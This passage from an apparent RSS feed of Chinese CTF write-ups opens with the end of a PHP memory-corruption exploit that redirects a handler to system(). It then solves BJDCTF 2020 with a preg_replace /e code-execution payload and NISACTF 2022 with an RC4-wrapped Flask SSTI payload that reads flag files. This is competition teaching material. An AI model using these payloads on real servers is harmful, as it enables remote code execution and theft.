</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">leak1</span><span class="p">(</span><span class="o">$</span><span class="n">class_entry</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="o">$</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>

</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="o">$</span><span class="n">abc_addr</span> <span class="o">+</span> <span class="o">$</span><span class="n">fake_tbl_off</span><span class="p">);</span>

</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="c1"># fake zval_reference</span>

</span></span><span class="line"><span class="cl"> <span class="k">for</span><span class="p">(</span><span class="o">$</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">$</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="o">$</span><span class="n">fake_bkt_off</span> <span class="o">+</span> <span class="o">$</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span>

</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="c1"># create a fake bucket</span>

</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="o">$</span><span class="n">fake_bkt_addr</span><span class="p">);</span>

</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="o">$</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">

</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="o">$</span><span class="n">fake_bkt_off</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="o">$</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">leak2</span><span class="p">(</span><span class="o">$</span><span class="n">function_zval</span><span class="p">,</span> <span class="o">$</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>

</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="c1"># pwn</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="o">$</span><span class="n">fake_bkt_off</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="o">$</span><span class="n">zif_system</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">abc</span><span class="p">,</span> <span class="o">$</span><span class="n">fake_bkt_off</span><span class="p">,</span> <span class="o">$</span><span class="n">fake_bkt_addr</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">spl1</span><span class="o">-&gt;</span><span class="n">offsetGet</span><span class="p">(</span><span class="o">$</span><span class="n">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="n">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">y</span> <span class="o">=</span> <span class="p">[</span><span class="n">new</span> <span class="n">Z</span><span class="p">()];</span>
</span></span><span class="line"><span class="cl"><span class="n">json_encode</span><span class="p">([</span><span class="o">&amp;$</span><span class="n">y</span><span class="p">]);</span></span></span></code></pre></td></tr></table>
</div>
</div>

item.title: 【BJDCTF 2020】ZJCTF，不过如此
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="bjdctf-2020zjctf不过如此" class="heading-element"><span>[BJDCTF 2020]ZJCTF，不过如此</span>
 <a href="#bjdctf-2020zjctf%e4%b8%8d%e8%bf%87%e5%a6%82%e6%ad%a4" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>进入后是一个GET传参，利用php伪协议得到next.php内容</li>
<li>next.php是一个php的<code>preg_replace /e</code> 模式漏洞利用，执行RCE</li>
<li>其中有一些部分需要绕过，最终执行命令得到flag</li>
</ul>
<h2 id="exp" class="heading-element"><span>EXP</span>
 <a href="#exp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>?text=data://text/pain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</li>
<li>得到next.php内容</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$id = $_GET[&#39;id&#39;];
</span></span><span class="line"><span class="cl">$_SESSION[&#39;id&#39;] = $id;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function complex($re, $str) {
</span></span><span class="line"><span class="cl"> return preg_replace(
</span></span><span class="line"><span class="cl"> &#39;/(&#39; . $re . &#39;)/ei&#39;,
</span></span><span class="line"><span class="cl"> &#39;strtolower(&#34;\\1&#34;)&#39;,
</span></span><span class="line"><span class="cl"> $str
</span></span><span class="line"><span class="cl"> );
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">foreach($_GET as $re =&gt; $str) {
</span></span><span class="line"><span class="cl"> echo complex($re, $str). &#34;\n&#34;;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function getFlag(){
</span></span><span class="line"><span class="cl"> @eval($_GET[&#39;cmd&#39;]);
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div><p>其中的<code>preg_replace /e</code> 存在漏洞。</p>
<p>e模式下的preg_replace可以让<strong>第二个参数</strong>&lsquo;替换字符串&rsquo;当作代码执行，但是这里第二个参数是<strong>不可变</strong>的。</p>
<p>但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将<strong>相关匹配存储到一个临时缓存区</strong>，并且从1开始排序。</p>
<p>而<code>strtolower(&quot;\1&quot;)</code>正好表达的就是匹配区的第一个（\1=\1），从而我们如果匹配可以，则可以将函数实现。
比如我们传入 <code>?.*={${phpinfo()}}</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&#34;\\1&#34;)&#39;,$str);		// 原句
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">preg_replace(&#39;/(&#39; .* &#39;)/ei&#39;,&#39;strtolower(&#34;\\1&#34;)&#39;,{${phpinfo()}});	// 输入后</span></span></code></pre></td></tr></table>
</div>
</div><p>又因为<code>$_GET</code>传入首字母是非法字符时候会把<code> .</code>（点号）改成下划线，因此得将<code>.</code>换成<code>\s</code></p>
<ul>
<li>
<p>next.php 页面payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?\S*=${getFlag()}&amp;cmd=system(&#39;ls /&#39;);
</span></span><span class="line"><span class="cl">?\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>PHP伪协议</li>
<li>正则绕过</li>
</ul>

item.title: 【NISACTF 2022】is secret
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="nisactf-2022is-secret" class="heading-element"><span>[NISACTF 2022]is secret</span>
 <a href="#nisactf-2022is-secret" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>进入没信息，用dirsearch扫网站</p>
</li>
<li>
<p>发现可以传参，?secret=32423452523</p>
</li>
<li>
<p>报错后发现源码泄露</p>
<ul>
<li>存在一个RC4加密（看到密钥）</li>
<li>存在SSTI模板注入</li>
</ul>
</li>
<li>
<p>使用脚本把secret内容加密传入（RC4是对称加密）</p>
</li>
<li>
<p>使用SSTI-Flask模板注入</p>
</li>
</ul>
<h2 id="exp" class="heading-element"><span>EXP</span>
 <a href="#exp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RC4加密代码</li>
</ul>
<blockquote>
<p>找了大佬的</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import base64
</span></span><span class="line"><span class="cl">from urllib.parse import quote
</span></span><span class="line"><span class="cl">def rc4_main(key = &#34;init_key&#34;, message = &#34;init_message&#34;):
</span></span><span class="line"><span class="cl"> # print(&#34;RC4加密主函数&#34;)
</span></span><span class="line"><span class="cl"> s_box = rc4_init_sbox(key)
</span></span><span class="line"><span class="cl"> crypt = str(rc4_excrypt(message, s_box))
</span></span><span class="line"><span class="cl"> return crypt
</span></span><span class="line"><span class="cl">def rc4_init_sbox(key):
</span></span><span class="line"><span class="cl"> s_box = list(range(256))
</span></span><span class="line"><span class="cl"> # print(&#34;原来的 s 盒：%s&#34; % s_box)
</span></span><span class="line"><span class="cl"> j = 0
</span></span><span class="line"><span class="cl"> for i in range(256):
</span></span><span class="line"><span class="cl"> j = (j + s_box[i] + ord(key[i % len(key)])) % 256
</span></span><span class="line"><span class="cl"> s_box[i], s_box[j] = s_box[j], s_box[i]
</span></span><span class="line"><span class="cl"> # print(&#34;混乱后的 s 盒：%s&#34;% s_box)
</span></span><span class="line"><span class="cl"> return s_box
</span></span><span class="line"><span class="cl">def rc4_excrypt(plain, box):
</span></span><span class="line"><span class="cl"> # print(&#34;调用加密程序成功。&#34;)
</span></span><span class="line"><span class="cl"> res = []
</span></span><span class="line"><span class="cl"> i = j = 0
</span></span><span class="line"><span class="cl"> for s in plain:
</span></span><span class="line"><span class="cl"> i = (i + 1) % 256
</span></span><span class="line"><span class="cl"> j = (j + box[i]) % 256
</span></span><span class="line"><span class="cl"> box[i], box[j] = box[j], box[i]
</span></span><span class="line"><span class="cl"> t = (box[i] + box[j]) % 256
</span></span><span class="line"><span class="cl"> k = box[t]
</span></span><span class="line"><span class="cl"> res.append(chr(ord(s) ^ k))
</span></span><span class="line"><span class="cl"> cipher = &#34;&#34;.join(res)
</span></span><span class="line"><span class="cl"> print(&#34;加密后的字符串是：%s&#34; %quote(cipher))
</span></span><span class="line"><span class="cl"> return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
</span></span><span class="line"><span class="cl">#固定rc4
</span></span><span class="line"><span class="cl">rc4_main(&#34;HereIsTreasure&#34;,&#34;{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat ../flag.txt&#39;).read()}}&#34;)
</span></span><span class="line"><span class="cl">#{{&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/flag.txt&#39;).read()}}</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>SSTI模板注入</li>
<li>找到os命令执行<code>{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}</code></li>
</ul>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>信息查找</li>
<li>RC4加密</li>
<li>SSTI模板注入</li>
</ul>
